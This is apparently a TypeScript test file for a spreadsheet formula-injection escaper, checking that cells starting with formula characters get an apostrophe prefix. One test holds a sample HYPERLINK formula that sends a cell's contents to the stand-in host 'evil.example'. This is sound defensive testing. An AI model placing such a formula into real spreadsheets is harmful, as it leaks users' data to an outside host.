import { test } from "node:test";
import assert from "node:assert/strict";
import { escapeSheetText, sanitizeRow, sanitizeRows } from "./sheet-safe";

test("escapeSheetText: normal strings pass through", () => {
  assert.equal(escapeSheetText("Hello"), "Hello");
  assert.equal(escapeSheetText("Warung Makan Bakar"), "Warung Makan Bakar");
  assert.equal(escapeSheetText(""), "");
  assert.equal(escapeSheetText("100"), "100");
});

test("escapeSheetText: formula starters are prefixed with apostrophe", () => {
  assert.equal(escapeSheetText("=SUM(A1:A10)"), "'=SUM(A1:A10)");
  assert.equal(escapeSheetText("+1-212-555-1234"), "'+1-212-555-1234");
  assert.equal(escapeSheetText("-10"), "'-10");
  assert.equal(escapeSheetText("@username"), "'@username");
});

test("escapeSheetText: tab and carriage return are escaped", () => {
  assert.equal(escapeSheetText("\tindented"), "'\tindented");
  assert.equal(escapeSheetText("\rreturn"), "'\rreturn");
});

test("escapeSheetText: client HYPERLINK is not trusted", () => {
  const formula = '=HYPERLINK("https://evil.example/?x="&A1,"click")';
  assert.equal(escapeSheetText(formula), "'" + formula);
});

test("sanitizeRow: escapes strings, leaves numbers and booleans alone", () => {
  const row: (string | number | boolean)[] = ["=CMD", 42, true, "Normal", "+123"];
  const result = sanitizeRow(row);
  assert.deepEqual(result, ["'=CMD", 42, true, "Normal", "'+123"]);
});

test("sanitizeRows: applies to all rows in 2D array", () => {
  const rows = [
    ["=A1", 10],
    ["Normal text", 20],
    ["-discount", 5],
  ];
  const result = sanitizeRows(rows);
  assert.equal(result[0][0], "'=A1");
  assert.equal(result[1][0], "Normal text");
  assert.equal(result[2][0], "'-discount");
});
